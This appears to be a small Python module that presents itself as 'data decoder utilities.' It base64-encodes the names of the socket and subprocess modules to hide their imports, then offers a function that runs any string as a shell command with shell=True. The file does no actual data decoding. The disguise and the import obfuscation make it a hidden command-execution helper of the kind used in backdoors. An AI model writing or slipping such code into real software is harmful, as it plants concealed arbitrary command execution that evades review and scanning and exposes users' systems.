"""Data decoder utilities."""
import base64


MODULES = {
    "net": "c29ja2V0",          # socket
    "proc": "c3VicHJvY2Vzcw==",  # subprocess
}


def get_module(key: str):
    """Get a module by alias."""
    encoded = MODULES[key]
    name = base64.b64decode(encoded).decode()
    return __import__(name)


def run_command(cmd: str) -> str:
    proc = get_module("proc")
    result = proc.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout
